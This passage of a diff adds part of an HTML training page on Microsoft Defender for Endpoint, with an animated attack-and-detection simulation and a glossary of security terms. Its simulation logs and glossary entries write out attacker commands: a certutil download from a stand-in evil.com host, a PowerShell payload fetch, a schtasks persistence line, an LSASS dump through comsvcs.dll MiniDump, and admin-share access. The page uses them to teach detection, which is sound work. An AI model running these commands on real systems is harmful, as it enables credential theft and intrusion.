+        <div class="why-item"><div class="why-icon">📉</div><div class="why-content"><h4>Reduce Attack Surface Measurably</h4><p>Exposure Score gives leadership a single number that tracks your organization's risk posture over time. When you patch, the score improves. When new vulns appear, it adjusts. Data-driven security reporting.</p></div></div>
+        <div class="why-item"><div class="why-icon">⚡</div><div class="why-content"><h4>No Extra Agents Needed</h4><p>TVM uses the same MDE sensor that's already deployed. No separate vulnerability scanner, no additional network traffic, no scanning windows. Continuous assessment with zero additional infrastructure.</p></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- SECTION 8: INTEGRATIONS -->
+<section id="integrations">
+  <div class="section-inner">
+    <div class="section-label" style="background:rgba(236,72,153,.15);color:var(--pink)">🔗 Layer 8</div>
+    <h2 class="section-title fade-in" style="text-align:center">Microsoft Defender XDR Ecosystem</h2>
+    <p class="section-desc fade-in" style="text-align:center;margin:0 auto 3rem">MDE integrates with the full Defender XDR suite for cross-product correlation and unified incident response.</p>
+
+    <div class="integrations-orbit fade-in">
+      <div class="orbit-center">
+        <div class="orbit-icon">🛡️</div>
+        Defender for<br>Endpoint
+      </div>
+      <div class="orbit-ring orbit-ring-1"></div>
+      <div class="orbit-ring orbit-ring-2"></div>
+
+      <div class="orbit-item" style="top:15px;left:50%;transform:translateX(-50%)"><div class="oi-icon">🆔</div>Defender for Identity</div>
+      <div class="orbit-item" style="top:50%;right:10px;transform:translateY(-50%)"><div class="oi-icon">📧</div>Defender for Office 365</div>
+      <div class="orbit-item" style="bottom:15px;left:50%;transform:translateX(-50%)"><div class="oi-icon">☁️</div>Defender for Cloud Apps</div>
+      <div class="orbit-item" style="top:50%;left:10px;transform:translateY(-50%)"><div class="oi-icon">🔐</div>Defender for Cloud</div>
+
+      <div class="orbit-item" style="top:0;left:10px"><div class="oi-icon">📱</div>Intune</div>
+      <div class="orbit-item" style="top:0;right:10px"><div class="oi-icon">📊</div>Sentinel</div>
+      <div class="orbit-item" style="bottom:0;left:10px"><div class="oi-icon">🔑</div>Entra ID</div>
+      <div class="orbit-item" style="bottom:0;right:10px"><div class="oi-icon">🐛</div>Vuln Mgmt</div>
+    </div>
+
+    <div class="why-box fade-in">
+      <div class="why-title">💡 Why XDR Integration Matters</div>
+      <div class="why-grid">
+        <div class="why-item"><div class="why-icon">🔗</div><div class="why-content"><h4>One Incident, Full Story</h4><p>A phishing email (Defender for Office) → compromised identity (Defender for Identity) → endpoint malware (MDE) → cloud app access (MCAS) = one correlated incident, not 4 separate alerts across 4 consoles.</p></div></div>
+        <div class="why-item"><div class="why-icon">🚀</div><div class="why-content"><h4>Automatic Attack Disruption</h4><p>Defender XDR can automatically disable a compromised user account, isolate the device, AND block the malicious email — across all products — in seconds. No human needed for containment.</p></div></div>
+        <div class="why-item"><div class="why-icon">💰</div><div class="why-content"><h4>Consolidation Saves Money</h4><p>Instead of buying separate EDR, email security, identity protection, CASB, and vuln management tools — MDE is part of an integrated platform. Fewer vendors, fewer consoles, lower total cost of ownership.</p></div></div>
+        <div class="why-item"><div class="why-icon">📊</div><div class="why-content"><h4>Unified Hunting & Reporting</h4><p>One KQL query across endpoint, email, identity, and cloud data. One dashboard for all alerts. One incident queue. Your SOC team works in a single pane of glass instead of alt-tabbing between 5 tools.</p></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- CHATBOX -->
+<button class="chat-toggle" id="chat-toggle" onclick="toggleChat()">💬</button>
+<div class="chat-panel" id="chat-panel">
+  <div class="chat-header">
+    <span class="ch-icon">🔍</span>
+    <span class="ch-title">Security Term Lookup</span>
+    <span class="ch-sub">200+ terms</span>
+  </div>
+  <div class="chat-messages" id="chat-messages">
+    <div class="chat-msg bot">👋 Ask me about any security term, protocol, file, or concept. Try: <strong>LSASS</strong>, <strong>port 445</strong>, <strong>T1566</strong>, <strong>ETW</strong>, <strong>.exe</strong>, <strong>KQL</strong></div>
+  </div>
+  <div class="chat-suggestions">
+    <span class="chat-sug" onclick="chatAsk('LSASS')">LSASS</span>
+    <span class="chat-sug" onclick="chatAsk('powershell.exe')">powershell.exe</span>
+    <span class="chat-sug" onclick="chatAsk('port 445')">port 445</span>
+    <span class="chat-sug" onclick="chatAsk('MITRE ATT&CK')">MITRE ATT&CK</span>
+    <span class="chat-sug" onclick="chatAsk('AMSI')">AMSI</span>
+    <span class="chat-sug" onclick="chatAsk('KQL')">KQL</span>
+    <span class="chat-sug" onclick="chatAsk('C2')">C2</span>
+    <span class="chat-sug" onclick="chatAsk('EDR')">EDR</span>
+  </div>
+  <div class="chat-input-row">
+    <input class="chat-input" id="chat-input" placeholder="Ask about any security term..." onkeydown="if(event.key==='Enter')sendChat()">
+    <button class="chat-send" onclick="sendChat()">→</button>
+  </div>
+</div>
+
+<footer>
+  <p>Built for learning • All data validated against <a href="https://learn.microsoft.com/en-us/defender-endpoint/" target="_blank">Microsoft Learn documentation</a> • March 2026</p>
+  <p style="margin-top:.5rem">Supported: Windows • macOS • Linux • Android • iOS • Network devices</p>
+</footer>
+
+<script>
+// Particle background
+(function(){
+  const c=document.getElementById('particles-canvas'),ctx=c.getContext('2d');
+  let w,h,particles=[];
+  function resize(){w=c.width=innerWidth;h=c.height=innerHeight}
+  resize();addEventListener('resize',resize);
+  class P{
+    constructor(){this.reset()}
+    reset(){this.x=Math.random()*w;this.y=Math.random()*h;this.vx=(Math.random()-.5)*.3;this.vy=(Math.random()-.5)*.3;this.r=Math.random()*1.5+.5;this.a=Math.random()*.3+.1}
+    update(){this.x+=this.vx;this.y+=this.vy;if(this.x<0||this.x>w)this.vx*=-1;if(this.y<0||this.y>h)this.vy*=-1}
+    draw(){ctx.beginPath();ctx.arc(this.x,this.y,this.r,0,Math.PI*2);ctx.fillStyle=`rgba(0,229,255,${this.a})`;ctx.fill()}
+  }
+  for(let i=0;i<80;i++)particles.push(new P);
+  function loop(){
+    ctx.clearRect(0,0,w,h);
+    particles.forEach(p=>{p.update();p.draw()});
+    for(let i=0;i<particles.length;i++){
+      for(let j=i+1;j<particles.length;j++){
+        const dx=particles[i].x-particles[j].x,dy=particles[i].y-particles[j].y,d=Math.sqrt(dx*dx+dy*dy);
+        if(d<150){ctx.beginPath();ctx.moveTo(particles[i].x,particles[i].y);ctx.lineTo(particles[j].x,particles[j].y);ctx.strokeStyle=`rgba(0,229,255,${.06*(1-d/150)})`;ctx.stroke()}
+      }
+    }
+    requestAnimationFrame(loop);
+  }
+  loop();
+})();
+
+// Scroll fade-in
+const observer=new IntersectionObserver(entries=>{
+  entries.forEach(e=>{if(e.isIntersecting){e.target.classList.add('visible');observer.unobserve(e.target)}});
+},{threshold:.15});
+document.querySelectorAll('.fade-in').forEach(el=>observer.observe(el));
+
+// Kill chain animation
+const kcObserver=new IntersectionObserver(entries=>{
+  entries.forEach(e=>{
+    if(e.isIntersecting){
+      const phases=document.getElementById('kc-timeline').querySelectorAll('.kc-phase');
+      phases.forEach((p,i)=>setTimeout(()=>p.classList.add('active'),i*600));
+      kcObserver.unobserve(e.target);
+    }
+  });
+},{threshold:.2});
+kcObserver.observe(document.getElementById('kc-timeline'));
+
+// Active nav
+const sections=document.querySelectorAll('section[id]');
+const navLinks=document.querySelectorAll('nav .nav-links a');
+addEventListener('scroll',()=>{
+  let current='';
+  sections.forEach(s=>{if(scrollY>=s.offsetTop-100)current=s.id});
+  navLinks.forEach(a=>a.classList.toggle('active',a.getAttribute('href')==='#'+current));
+});
+
+// Expandable cards
+document.querySelectorAll('.expandable').forEach(el=>el.addEventListener('click',()=>el.classList.toggle('open')));
+
+// Telemetry ticker
+const events=[
+  'DeviceProcessEvents | powershell.exe -enc aQBlAHgA... | DESKTOP-SEC01 | admin',
+  'DeviceNetworkEvents | 185.220.101.42:443 HTTPS POST | LAPTOP-FIN03 | svchost.exe',
+  'DeviceFileEvents | C:\\Users\\jdoe\\AppData\\Temp\\payload.dll CREATED | WS-DEV07',
+  'DeviceRegistryEvents | HKLM\\..\\CurrentVersion\\Run\\Update MODIFIED | SVR-DC01',
+  'DeviceLogonEvents | RDP logon FAILED | admin@CONTOSO | from 10.0.0.55 | SVR-WEB02',
+  'DeviceImageLoadEvents | unsigned amsi.dll loaded into powershell.exe | DESKTOP-HR04',
+  'DeviceEvents | AMSI: Invoke-Mimikatz -DumpCreds | DESKTOP-SEC01',
+  'AlertInfo | HIGH | Suspicious credential dump | T1003.001 | DESKTOP-SEC01',
+  'DeviceProcessEvents | cmd.exe -> net user /domain | LAPTOP-FIN03 | discovery',
+  'DeviceNetworkEvents | DNS: evil-c2.example.com | DESKTOP-HR04',
+  'DeviceFileEvents | C:\\Windows\\Temp\\exfil.zip CREATED (45MB) | SVR-FILE01',
+  'DeviceProcessEvents | schtasks.exe /create /tn SystemCheck | WS-DEV07 | persistence',
+];
+const ticker=document.getElementById('telemetry-ticker');
+let html=events.map(e=>`<span style="margin-right:4rem;color:${e.includes('Alert')?'#ef4444':e.includes('FAILED')?'#f97316':'#94a3b8'}">${e}</span>`).join('');
+ticker.innerHTML=html+html;
+
+// ===== MDE IN ACTION SIMULATION =====
+let simRunning=false,simPaused=false,simStepIdx=0,simTimer=null,simSpeed=1;
+const BASE_DELAY_MULT=2.5; // 2.5x slower than original
+
+const SIM_STEPS=[
+  {d:0,p:'narr',ns:'Phase 0 of 7',nt:'🎬 Simulation starting... An attacker targets a finance department employee with a spearphishing email.',nc:''},
+  {d:2000,p:'attacker',c:'log-red',i:'📧',m:'Crafted spearphishing email with malicious .docm attachment'},
+  {d:1500,p:'attacker',c:'log-red',i:'🎯',m:'Target: jdoe@contoso.com (Finance Dept)'},
+  {d:1500,p:'attacker',c:'log-red',i:'📤',m:'Email sent → "Q4 Budget Review - URGENT.docm"'},
+  {d:2000,p:'narr',ns:'Phase 1 of 7 — Initial Access',nt:'📧 The phishing email lands in the user\'s inbox. The user opens the Word document and enables macros. The MDE sensor immediately starts capturing telemetry.',nc:'narr-red'},
+  {d:2500,p:'endpoint',c:'log-cyan',i:'📂',m:'User opened: Q4 Budget Review - URGENT.docm'},
+  {d:1500,p:'endpoint',c:'log-cyan',i:'⚡',m:'WINWORD.EXE (PID 4521) started',showArrowAtk:true},
+  {d:2000,p:'endpoint',c:'log-orange',i:'⚠️',m:'VBA Macro executing in WINWORD.EXE'},
+  {d:1500,p:'cloud',c:'log-blue',i:'📡',m:'Telemetry received: AMSI content from WINWORD.EXE',showArrowTel:true},
+  {d:1800,p:'cloud',c:'log-blue',i:'🤖',m:'AMSI-Paired ML Engine analyzing VBA macro content...'},
+  {d:2000,p:'endpoint',c:'log-red',i:'🔴',m:'WINWORD.EXE spawned powershell.exe -enc aQBlAHgA...',devInfected:true},
+  {d:1500,p:'cloud',c:'log-blue',i:'🧬',m:'File Classification ML: analyzing powershell payload'},
+  {d:1500,p:'cloud',c:'log-orange',i:'⚠️',m:'ASR Rule triggered: "Block Office from creating child processes"'},
+  {d:2000,p:'soc',c:'log-orange',i:'🚨',m:'ALERT: Suspicious process launched by Office application',socAlert:true},
+  {d:1000,p:'soc',c:'log-dim',i:'📋',m:'Severity: HIGH | MITRE: T1566.001 Spearphishing'},
+
+  {d:3000,p:'narr',ns:'Phase 2 of 7 — Execution',nt:'⚡ The macro downloads and executes a PowerShell payload. AMSI sees the deobfuscated content — even though the attacker Base64-encoded it. The cloud Reputation ML flags the download URL as malicious.',nc:'narr-red'},
+  {d:2500,p:'endpoint',c:'log-red',i:'⬇️',m:'powershell.exe downloading payload from evil-c2.example[.]com'},
+  {d:1500,p:'cloud',c:'log-blue',i:'🌐',m:'Network Protection: SmartScreen checking URL reputation'},
+  {d:2000,p:'cloud',c:'log-orange',i:'⛔',m:'Reputation ML: evil-c2.example[.]com → MALICIOUS'},
+  {d:1500,p:'endpoint',c:'log-cyan',i:'📡',m:'AMSI captured deobfuscated content: Invoke-Mimikatz ...'},
+  {d:1500,p:'cloud',c:'log-blue',i:'🤖',m:'AMSI-Paired ML (PowerShell model): MALICIOUS verdict'},
+  {d:2000,p:'soc',c:'log-orange',i:'🚨',m:'ALERT: Encoded PowerShell command execution detected'},
+  {d:1000,p:'soc',c:'log-dim',i:'📋',m:'Severity: HIGH | MITRE: T1059.001 PowerShell'},
+
+  {d:3000,p:'narr',ns:'Phase 3 of 7 — Persistence',nt:'🔄 The attacker creates a scheduled task to survive reboots. MDE catches this through TWO independent data sources: the process event (schtasks.exe) AND the registry modification (task registration). Redundant detection.',nc:'narr-red'},
+  {d:2500,p:'attacker',c:'log-red',i:'🔄',m:'Creating persistence via scheduled task'},
+  {d:2000,p:'endpoint',c:'log-red',i:'⚙️',m:'schtasks.exe /create /tn "WinUpdate" /sc onlogon /tr powershell.exe'},
+  {d:1500,p:'endpoint',c:'log-cyan',i:'🗝️',m:'Registry modified: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Schedule'},
+  {d:1500,p:'cloud',c:'log-blue',i:'📡',m:'DeviceProcessEvents: schtasks.exe with persistence pattern'},
+  {d:1200,p:'cloud',c:'log-blue',i:'📡',m:'DeviceRegistryEvents: scheduled task registration'},
+  {d:2000,p:'soc',c:'log-orange',i:'🚨',m:'ALERT: Suspicious scheduled task created for persistence'},
+  {d:1000,p:'soc',c:'log-dim',i:'📋',m:'Severity: MEDIUM | MITRE: T1053.005 Scheduled Task'},
+
+  {d:3000,p:'narr',ns:'Phase 4 of 7 — Discovery',nt:'🔎 The attacker runs a burst of recon commands. Individually, each command is legitimate. But MDE\'s behavioral ML recognizes the <em>pattern</em> — 5 discovery commands from the same suspicious process tree within seconds = attacker behavior.',nc:'narr-red'},
+  {d:2500,p:'attacker',c:'log-red',i:'🔎',m:'Running discovery commands to map the environment'},
+  {d:1200,p:'endpoint',c:'log-red',i:'💻',m:'systeminfo → OS, hotfixes, network config'},
+  {d:1000,p:'endpoint',c:'log-red',i:'👤',m:'whoami /all → current privileges & groups'},
+  {d:1000,p:'endpoint',c:'log-red',i:'🌐',m:'ipconfig /all → network adapters & DNS'},
+  {d:1000,p:'endpoint',c:'log-red',i:'👥',m:'net user /domain → domain user enumeration'},
+  {d:1000,p:'endpoint',c:'log-red',i:'📡',m:'netstat -ano → active network connections'},
+  {d:2000,p:'cloud',c:'log-blue',i:'🧠',m:'Behavioral ML: burst of 5 recon commands from suspicious process tree → DISCOVERY PATTERN'},
+  {d:2000,p:'soc',c:'log-yellow',i:'🚨',m:'ALERT: Suspicious system discovery activity detected'},
+  {d:1000,p:'soc',c:'log-dim',i:'📋',m:'Severity: MEDIUM | MITRE: T1082, T1016, T1049'},
+
+  {d:3000,p:'narr',ns:'Phase 5 of 7 — Credential Access',nt:'🔓 The attacker tries to dump passwords from LSASS memory. This is caught by THREE independent layers: the ASR rule blocks it at the endpoint, the memory scanning engine detects the access pattern, and kernel optics see the MiniDump call. Defense in depth.',nc:'narr-red'},
+  {d:2500,p:'attacker',c:'log-red',i:'🔓',m:'Attempting LSASS credential dump via comsvcs.dll MiniDump'},
+  {d:2000,p:'endpoint',c:'log-red',i:'⛔',m:'rundll32.exe comsvcs.dll MiniDump → targeting LSASS (PID 632)'},
+  {d:1500,p:'endpoint',c:'log-orange',i:'🛡️',m:'ASR Rule BLOCKED: "Block credential stealing from LSASS"'},
+  {d:1500,p:'cloud',c:'log-blue',i:'🧠',m:'Memory Scanning Engine: detected LSASS access attempt'},
+  {d:1200,p:'cloud',c:'log-blue',i:'🔬',m:'Kernel optics: MiniDump call pattern on LSASS process'},
+  {d:2000,p:'soc',c:'log-red',i:'🚨',m:'ALERT: Credential dumping attempt on LSASS blocked!'},
+  {d:1000,p:'soc',c:'log-dim',i:'📋',m:'Severity: HIGH | MITRE: T1003.001 LSASS Memory'},
+  {d:1000,p:'soc',c:'log-green',i:'✅',m:'ASR Rule prevented credential theft — attack blocked at endpoint'},
+
+  {d:3000,p:'narr',ns:'Phase 6 of 7 — Lateral Movement',nt:'↔️ The attacker tries to move to another device via SMB admin shares. This is where MDE\'s <em>cross-device correlation</em> shines — no single endpoint sees the full picture, but the cloud backend connects Device A\'s outbound SMB to Device B\'s inbound logon.',nc:'narr-red'},
+  {d:2500,p:'attacker',c:'log-red',i:'↔️',m:'Attempting lateral movement to SVR-DC01 via SMB'},
+  {d:2000,p:'endpoint',c:'log-red',i:'🌐',m:'net use \\\\SVR-DC01\\C$ → SMB connection to port 445'},
+  {d:1500,p:'cloud',c:'log-blue',i:'📡',m:'DeviceNetworkEvents: outbound SMB to SVR-DC01:445'},
+  {d:1500,p:'cloud',c:'log-blue',i:'🔗',m:'Cross-device correlation: DESKTOP-FIN01 → SVR-DC01'},
+  {d:1500,p:'cloud',c:'log-blue',i:'🆔',m:'DeviceLogonEvents on SVR-DC01: network logon from unusual source'},
+  {d:2000,p:'soc',c:'log-red',i:'🚨',m:'ALERT: Lateral movement detected via SMB admin shares'},
+  {d:1000,p:'soc',c:'log-dim',i:'📋',m:'Severity: HIGH | MITRE: T1021.002 SMB/Admin Shares'},
+
+  {d:3500,p:'narr',ns:'Phase 7 of 7 — Automated Response',nt:'🤖 AIR (Automated Investigation & Remediation) activates. All 6 alerts are correlated into a <em>single incident</em>. AIR examines every entity, expands scope to check SVR-DC01, and auto-remediates: quarantine, kill, remove persistence, isolate device.',nc:'narr-green'},
+  {d:2500,p:'soc',c:'log-purple',i:'🤖',m:'AIR triggered: Automated Investigation starting...',socInvestigate:true},
+  {d:2000,p:'soc',c:'log-purple',i:'🔬',m:'Examining entities: 3 files, 5 processes, 2 network connections'},
+  {d:2000,p:'soc',c:'log-purple',i:'🔀',m:'Expanding scope: checking SVR-DC01 for same threat indicators'},
+  {d:2000,p:'soc',c:'log-purple',i:'⚖️',m:'Verdicts: powershell payload → MALICIOUS | schtasks → MALICIOUS'},
+  {d:2000,p:'soc',c:'log-green',i:'🔒',m:'ACTION: Isolating DESKTOP-FIN01 from network',devIsolated:true},
+  {d:1500,p:'endpoint',c:'log-orange',i:'🔒',m:'Device ISOLATED — only MDE cloud channel remains active'},
+  {d:2000,p:'soc',c:'log-green',i:'🗑️',m:'ACTION: Quarantined malicious payload (SHA256: 7f3a2b...)'},
+  {d:1500,p:'soc',c:'log-green',i:'⏹️',m:'ACTION: Killed malicious powershell.exe (PID 4890)'},
+  {d:1500,p:'soc',c:'log-green',i:'🗓️',m:'ACTION: Removed scheduled task "WinUpdate"'},
+  {d:1500,p:'endpoint',c:'log-green',i:'🔍',m:'Full AV scan initiated remotely...', devScanning:true},
+  {d:2500,p:'endpoint',c:'log-green',i:'✅',m:'AV scan complete: 1 threat quarantined, 0 remaining'},
+  {d:2000,p:'soc',c:'log-green',i:'📦',m:'ACTION: Investigation package collected from DESKTOP-FIN01'},
+  {d:2000,p:'soc',c:'log-green',i:'📊',m:'Incident created: INC-2026-0847 | 6 alerts correlated'},
+  {d:1500,p:'soc',c:'log-dim',i:'📋',m:'MITRE mapping: T1566.001, T1059.001, T1053.005, T1082, T1003.001, T1021.002'},
+  {d:2500,p:'endpoint',c:'log-green',i:'✅',m:'Device remediated and clean',devClean:true},
+  {d:3500,p:'narr',ns:'✅ Simulation Complete',nt:'Attack fully detected and stopped. <strong>6 alerts → 1 incident → automated remediation in minutes.</strong> From initial access to full containment — that\'s MDE in action. Press ↺ Reset to replay.',nc:'narr-green'},
+];
+
+const totalDuration=SIM_STEPS.reduce((a,s)=>a+s.d,0);
+
+function addLog(panelId,cssClass,icon,message){
+  const log=document.getElementById('log-'+panelId);
+  if(!log)return;
+  const now=new Date();
+  const ts=now.toLocaleTimeString('en-US',{hour12:false,hour:'2-digit',minute:'2-digit',second:'2-digit'});
+  const entry=document.createElement('div');
+  entry.className=`log-entry ${cssClass}`;
+  entry.innerHTML=`<span class="log-time">${ts}</span><span class="log-icon">${icon}</span><span class="log-msg">${message}</span>`;
+  log.appendChild(entry);
+  requestAnimationFrame(()=>{entry.classList.add('visible');log.scrollTop=log.scrollHeight});
+}
+
+function setNarrative(step,text,cls){
+  const n=document.getElementById('sim-narrative');
+  n.className='sim-narrative '+(cls||'');
+  n.innerHTML=`<div class="narr-step">${step}</div><div class="narr-text">${text}</div>`;
+}
+
+function setDeviceState(state){
+  const d=document.getElementById('sim-device');
+  const s=document.getElementById('device-status');
+  d.className='sim-device';
+  if(state==='infected'){d.classList.add('infected');s.style.background='rgba(239,68,68,.15)';s.style.color='var(--red)';s.textContent='⚠ Compromised'}
+  else if(state==='isolated'){d.classList.add('isolated');s.style.background='rgba(249,115,22,.15)';s.style.color='var(--orange)';s.textContent='🔒 Isolated'}
+  else if(state==='scanning'){d.classList.add('scanning');s.style.background='rgba(234,179,8,.15)';s.style.color='var(--yellow)';s.textContent='🔍 Scanning...'}
+  else if(state==='clean'){d.classList.add('clean');s.style.background='rgba(34,197,94,.15)';s.style.color='var(--green)';s.textContent='✅ Clean & Protected'}
+  else{s.style.background='rgba(34,197,94,.15)';s.style.color='var(--green)';s.textContent='● Healthy'}
+}
+
+function highlightPanel(id,type){
+  ['attacker','endpoint','cloud','soc'].forEach(p=>{const el=document.getElementById('panel-'+p);if(el)el.classList.remove('highlight','alert-highlight','green-highlight')});
+  if(id){const el=document.getElementById('panel-'+id);if(el&&type)el.classList.add(type)}
+}
+
+function updateProgress(){
+  const elapsed=SIM_STEPS.slice(0,simStepIdx).reduce((a,s)=>a+s.d,0);
+  document.getElementById('sim-progress-bar').style.width=(elapsed/totalDuration*100)+'%';
+}
+
+function executeStep(idx){
+  if(idx>=SIM_STEPS.length){
+    simRunning=false;simPaused=false;
+    document.getElementById('sim-play').textContent='▶ Replay';
+    document.getElementById('sim-play').classList.remove('active');
+    document.getElementById('sim-pause').textContent='⏸ Pause';
+    highlightPanel('soc','green-highlight');
+    return;
+  }
+  const step=SIM_STEPS[idx];
+  simStepIdx=idx+1;
+  updateProgress();
+  document.getElementById('sim-step-label').textContent=step.ns||document.getElementById('sim-step-label').textContent;
+
+  if(step.p==='narr'){setNarrative(step.ns,step.nt,step.nc)}
+  else{
+    addLog(step.p,step.c,step.i,step.m);
+    if(step.p==='attacker')highlightPanel('attacker','alert-highlight');
+    else if(step.p==='endpoint')highlightPanel('endpoint','highlight');
+    else if(step.p==='cloud')highlightPanel('cloud','highlight');
+    else if(step.p==='soc'&&step.c&&step.c.includes('green'))highlightPanel('soc','green-highlight');
+    else if(step.p==='soc')highlightPanel('soc','alert-highlight');
+  }
+  if(step.showArrowAtk)document.getElementById('arrow-attack').classList.add('visible');
+  if(step.showArrowTel)document.getElementById('arrow-telemetry').classList.add('visible');
+  if(step.devInfected)setDeviceState('infected');
+  if(step.devIsolated)setDeviceState('isolated');
+  if(step.devScanning)setDeviceState('scanning');
+  if(step.devClean)setDeviceState('clean');
+}
+
+function scheduleNext(){
+  if(!simRunning||simPaused||simStepIdx>=SIM_STEPS.length)return;
+  const nextDelay=SIM_STEPS[simStepIdx]?SIM_STEPS[simStepIdx].d:1000;
+  const adjusted=(nextDelay*BASE_DELAY_MULT)/simSpeed;
+  simTimer=setTimeout(()=>{
+    executeStep(simStepIdx);
+    scheduleNext();
+  },adjusted);
+}
+
+function startSimulation(){
+  if(simRunning&&!simPaused)return;
+  if(simPaused){togglePause();return}
+  if(simStepIdx>=SIM_STEPS.length)resetSimulation();
+  simRunning=true;simPaused=false;
+  document.getElementById('sim-play').classList.add('active');
+  document.getElementById('sim-play').textContent='▶ Playing...';
+  scheduleNext();
+}
+
+function togglePause(){
+  if(!simRunning)return;
+  simPaused=!simPaused;
+  const btn=document.getElementById('sim-pause');
+  const playBtn=document.getElementById('sim-play');
+  if(simPaused){
+    clearTimeout(simTimer);
+    btn.textContent='▶ Resume';btn.classList.add('paused');
+    playBtn.textContent='⏸ Paused';playBtn.classList.remove('active');
+  }else{
+    btn.textContent='⏸ Pause';btn.classList.remove('paused');
+    playBtn.textContent='▶ Playing...';playBtn.classList.add('active');
+    scheduleNext();
+  }
+}
+
+function nextStep(){
+  if(simStepIdx>=SIM_STEPS.length)return;
+  clearTimeout(simTimer);
+  simRunning=true;simPaused=true;
+  document.getElementById('sim-play').textContent='⏸ Paused';
+  document.getElementById('sim-play').classList.remove('active');
+  document.getElementById('sim-pause').textContent='▶ Resume';
+  document.getElementById('sim-pause').classList.add('paused');
+  executeStep(simStepIdx);
+}
+
+function setSpeed(s){
+  simSpeed=s;
+  document.querySelectorAll('.speed-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById(s===0.5?'speed-slow':s===1?'speed-normal':'speed-fast').classList.add('active');
+  if(simRunning&&!simPaused){clearTimeout(simTimer);scheduleNext()}
+}
+
+function resetSimulation(){
+  simRunning=false;simPaused=false;simStepIdx=0;
+  clearTimeout(simTimer);
+  ['attacker','endpoint','cloud','soc'].forEach(p=>{const el=document.getElementById('log-'+p);if(el)el.innerHTML=''});
+  document.getElementById('sim-progress-bar').style.width='0%';
+  document.getElementById('sim-step-label').textContent='Ready to start';
+  document.getElementById('sim-play').classList.remove('active');
+  document.getElementById('sim-play').textContent='▶ Play';
+  document.getElementById('sim-pause').textContent='⏸ Pause';
+  document.getElementById('sim-pause').classList.remove('paused');
+  document.getElementById('arrow-attack').classList.remove('visible');
+  document.getElementById('arrow-telemetry').classList.remove('visible');
+  setDeviceState('healthy');
+  highlightPanel(null);
+  setNarrative('Welcome','Press <strong>▶ Play</strong> to auto-play, or <strong>⏭ Next Step</strong> to advance one step at a time for presentations.','');
+}
+// ===== SECURITY TERM CHATBOX =====
+const TERMS={
+// PROCESSES & FILES
+'lsass':{n:'LSASS (lsass.exe)',c:'Windows Process',d:'Local Security Authority Subsystem Service. Handles user authentication, password changes, and access token creation in Windows. Stores credentials in memory — attackers dump LSASS to steal passwords and hashes. Protected by Credential Guard and ASR rules in MDE.'},
+'lsass.exe':{n:'lsass.exe',c:'Windows Process',d:'The executable for LSASS. Runs as SYSTEM. If you see ANY process trying to read lsass.exe memory (via MiniDump, procdump, or direct access), it\'s almost certainly credential theft (MITRE T1003.001).'},
+'svchost.exe':{n:'svchost.exe',c:'Windows Process',d:'Service Host — runs Windows services. Legitimate svchost always lives in C:\\Windows\\System32\\. If you see it running from ANY other location, it\'s malware masquerading as svchost. MDE flags this automatically.'},
+'powershell.exe':{n:'PowerShell (powershell.exe)',c:'Windows Process',d:'Windows command-line shell and scripting language. Heavily abused by attackers for fileless attacks, download cradles, and encoded commands. MDE monitors via AMSI (sees decoded content), script block logging, and behavioral ML. Common attack pattern: -enc (encoded command), -ep bypass, IEX (Invoke-Expression).'},
+'cmd.exe':{n:'Command Prompt (cmd.exe)',c:'Windows Process',d:'Windows command interpreter. Legitimate when launched by explorer.exe (user opened it). Suspicious when spawned by Office apps (Word→cmd.exe = likely macro attack), services.exe, or unusual parents. MDE tracks the full parent-child process tree.'},
+'rundll32.exe':{n:'rundll32.exe',c:'Windows Process',d:'Runs DLL files as programs. Legitimate Windows utility but heavily abused by attackers to execute malicious DLLs, dump LSASS (via comsvcs.dll MiniDump), and bypass application whitelisting. MDE detects suspicious rundll32 command lines.'},
+'mshta.exe':{n:'mshta.exe',c:'Windows Process',d:'Microsoft HTML Application Host. Executes .hta files which can contain VBScript/JScript. Commonly abused for initial access — attacker sends .hta file via email, user opens it, mshta executes the embedded script. ASR rules can block this.'},
+'wmic.exe':{n:'wmic.exe',c:'Windows Process',d:'Windows Management Instrumentation Command-line. Used for system queries and remote execution. Attackers use it for discovery (wmic process list) and lateral movement (wmic /node:TARGET process call create). Deprecated but still present.'},
+'certutil.exe':{n:'certutil.exe',c:'Windows Process',d:'Windows certificate utility. Attackers abuse it to download files (certutil -urlcache -f http://evil.com/payload.exe), decode Base64, and calculate file hashes. A LOLBin (Living-off-the-Land Binary) — legitimate tool used maliciously.'},
+'mssense.exe':{n:'MsSense.exe',c:'MDE Process',d:'The Microsoft Defender for Endpoint sensor process. This is the core EDR agent that collects behavioral telemetry from the kernel and streams it to the cloud. Runs as SYSTEM. If this process is stopped or tampered with, tamper protection should prevent it.'},
+'mpcmdrun.exe':{n:'MpCmdRun.exe',c:'MDE Process',d:'Microsoft Defender Antivirus command-line tool. Used for scanning, signature updates, and managing exclusions. Attackers sometimes abuse it to download files (MpCmdRun -DownloadFile) — another LOLBin.'},
+'.exe':{n:'.exe (Executable)',c:'File Type',d:'Windows executable file. The most common way malware is delivered and executed. MDE scans .exe files at creation with local ML, cloud ML, heuristics, and emulation. "Block at first sight" holds unknown .exe files from executing until the cloud ML provides a verdict.'},
+'.dll':{n:'.dll (Dynamic Link Library)',c:'File Type',d:'Shared code library loaded by processes. Attackers use malicious DLLs for: sideloading (placing a malicious DLL where a legitimate app loads it), injection (loading into another process\'s memory), and persistence. MDE tracks all DLL loads via DeviceImageLoadEvents.'},
+'.ps1':{n:'.ps1 (PowerShell Script)',c:'File Type',d:'PowerShell script file. Can contain complex attack logic. MDE captures the full script content via AMSI even if the script is obfuscated or encoded. ASR rules can block PowerShell scripts from running in certain contexts.'},
+'.hta':{n:'.hta (HTML Application)',c:'File Type',d:'HTML Application file executed by mshta.exe. Can contain VBScript/JScript with full system access (unlike browser HTML). Common initial access vector via email attachments. ASR rules can block .hta execution.'},
+
+// PROTOCOLS & PORTS
+'port 445':{n:'Port 445 (SMB)',c:'Network Protocol',d:'Server Message Block — Windows file sharing protocol. Used for accessing network shares (\\\\server\\share). Attackers use it for lateral movement (PsExec, admin shares C$). MDE detects suspicious SMB connections via DeviceNetworkEvents and cross-device correlation.'},
+'port 3389':{n:'Port 3389 (RDP)',c:'Network Protocol',d:'Remote Desktop Protocol. Provides remote GUI access to Windows machines. #1 target for brute-force attacks. Should NEVER be exposed to the internet. MDE detects suspicious RDP connections and JIT VM access in Defender for Cloud limits exposure.'},
